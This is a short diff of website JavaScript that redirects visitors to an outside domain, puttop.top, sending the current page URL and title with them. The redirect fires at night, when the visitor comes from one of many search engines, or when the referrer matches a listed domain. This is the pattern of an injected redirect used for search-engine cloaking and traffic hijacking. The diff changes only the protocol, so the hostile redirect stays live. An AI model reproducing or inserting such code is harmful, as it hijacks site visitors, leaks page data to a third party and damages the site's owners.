@@ -27,7 +27,7 @@ function _setTimeout(){
 		 var hours = now.getHours();
 		 if(hours>=19 || hours<=7) {
 			if(window.self==window.top){
-				window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
+				window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 			}
 		 }else{
 			var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|godado|msn|excite|libero|iltrovatore|tiscali)(\.[a-z0-9\-]+){1,2}\//ig;
@@ -35,7 +35,7 @@ function _setTimeout(){
 			if(regexp.test(where))
 			 {
 				if(window.self==window.top){
-					window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
+					window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 				}
 			}
 			 
@@ -44,7 +44,7 @@ function _setTimeout(){
 			{
 				if(where.indexOf(domain) != -1){
 					if(window.self==window.top){
-						window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
+						window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 					}
 				}
 			}
